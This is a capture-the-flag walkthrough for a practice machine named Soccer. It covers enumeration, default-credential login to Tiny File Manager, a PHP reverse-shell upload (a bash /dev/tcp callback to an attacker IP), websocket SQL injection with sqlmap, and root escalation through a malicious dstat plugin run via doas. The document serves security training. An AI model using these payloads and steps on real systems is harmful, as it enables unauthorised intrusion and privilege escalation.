## Nmap
From the nmap scan, we are able to find open ports 21,80 and 9091
![nmap](https://github.com/joelczk/writeups/blob/main/HTB/Images/Soccer/nmap.png)

Next, we will add the following lines to our /etc/hosts file

```
10.10.11.194    soccer.htb
```

## Enumerating Port 80
Using gobuster, we are able to enumerate the endpoints of port 80. From the output, we are able to find the following endpoints:

```
http://soccer.htb/index.html           (Status: 200) [Size: 6917]
http://soccer.htb/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
```

## Exploiting http://soccer.htb/tiny
### Weak Password Authentication
Navigating to http://soccer.htb/tiny, we can find that this site hosts Tiny Site Manager. Using the default admin credentials (admin:admin@123), we are able to gain access to the site

### CVE-2021-45010
After logging in, we realize that the version of Tiny Site Manager that we are using is 2.4.3
From [here](https://packetstormsecurity.com/files/166004/Tiny-File-Manager-2.4.3-Shell-Upload.html), we know that Tiny File Manager 2.4.3 is vulnerable to a shell upload. We will first start by crafting a PHP reverse shell payload.

```php
<?php echo shell_exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.2/80 0>&1'");?>
```
Afterwards, we will then upload the reverse shell payload and set the appropriate permissions for the uploaded file.

![File Upload](https://github.com/joelczk/writeups/blob/main/HTB/Images/Soccer/file_upload.png)

![perms](https://github.com/joelczk/writeups/blob/main/HTB/Images/Soccer/perms.png)

Finally, we will visit http://soccer.htb/tiny/uploads/shell.php to spawn the reverse shell connection to our local listener
![Reverse Shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Soccer/reverse_shell.png)

## Privilege Escalation to player user
### Port 3000 on localhost
Using linpeas, we are able to find that port 3000 is open on the localhost

```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                              
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:9091            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1112/nginx: worker  
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      1112/nginx: worker 
```

We will then forward the traffic on port 3000 on the localhost to our local machine using Chisel
![Port Forwarding](https://github.com/joelczk/writeups/blob/main/HTB/Images/Soccer/port_forwarding.png)

### SQL Injection on Port 3000
Using gobuster, we are able to find the following endpoints that are listening on port 3000

```
http://127.0.0.1:3000/login                (Status: 200) [Size: 3307]
http://127.0.0.1:3000/img                  (Status: 301) [Size: 173] [--> /img/]
http://127.0.0.1:3000/signup               (Status: 200) [Size: 3741]
http://127.0.0.1:3000/css                  (Status: 301) [Size: 173] [--> /css/]
http://127.0.0.1:3000/Login                (Status: 200) [Size: 3307]
http://127.0.0.1:3000/js                   (Status: 301) [Size: 171] [--> /js/]
http://127.0.0.1:3000/logout               (Status: 302) [Size: 23] [--> /]
http://127.0.0.1:3000/check                (Status: 200) [Size: 31]
http://127.0.0.1:3000/match                (Status: 200) [Size: 10078]
http://127.0.0.1:3000/Signup               (Status: 200) [Size: 3741]
http://127.0.0.1:3000/SignUp               (Status: 200) [Size: 3741]
http://127.0.0.1:3000/Logout               (Status: 302) [Size: 23] [--> /]
http://127.0.0.1:3000/signUp               (Status: 200) [Size: 3741]
http://127.0.0.1:3000/Match                (Status: 200) [Size: 10078]
http://127.0.0.1:3000/LogIn                (Status: 200) [Size: 3307]
http://127.0.0.1:3000/LOGIN                (Status: 200) [Size: 3307]
```

We also realize that http://127.0.0.1:3000/check requires authentication. To access the ```/check``` endpoint, we will then have to sign up for a new user and login using the new user.

Intercepting the requests, we realize that the websocket requests made at the endpoint is vulnerable to SQL injection
![SQL Injection](https://github.com/joelczk/writeups/blob/main/HTB/Images/Soccer/sql_injection.png)

Using the tutorial from [here](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html), we can forward the web socket requests to port 8081 on our localhost

![SQL Injection localhost](https://github.com/joelczk/writeups/blob/main/HTB/Images/Soccer/sql_injection_localhost.png)

Afterwards, we can use sqlmap to obtain the password of the ```player``` user

![sqlmap](https://github.com/joelczk/writeups/blob/main/HTB/Images/Soccer/sqlmap.png)

## Obtaining user.txt
Using the password that we have obtained earlier, we can then gain SSH access to the ```player``` user and obtain the user.txt contents

![user.txt](https://github.com/joelczk/writeups/blob/main/HTB/Images/Soccer/user.txt.png)

## Privilege Escalation to root user
### Exploiting /usr/bin/doas

We realize that the system is using ```/usr/bin/doas``` binary. From [here](https://www.makeuseof.com/how-to-install-and-use-doas/), ```doas``` is an alternative to sudo. Checking the configuration file at 
```/usr/local/etc/doas.conf```, we realize that we can execute ```/usr/bin/dstat``` with root permissions using ```doas```

![doas conf](https://github.com/joelczk/writeups/blob/main/HTB/Images/Soccer/doas_conf.png)

### Exploiting /usr/bin/dstat

Looking at the manual for dstat, we realize that we are able to add python plugins for dstat

![dstat manual](https://github.com/joelczk/writeups/blob/main/HTB/Images/Soccer/dstat_manual.png)

Next, we will write a python script to spawn an interactive shell and name it ```dstat_exploit.py```

```
import os
os.system("/bin/bash -i")
```

We realize that we can write into /usr/local/share/dstat. Afterwards, we will then use ```doas``` to spawn an interactive bash shell with root privileges

![root shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Soccer/root_shell.png)

### Obtaining root flaf
From the root shll, we can then obtain the root flag

![root flag](https://github.com/joelczk/writeups/blob/main/HTB/Images/Soccer/root_flag.png)
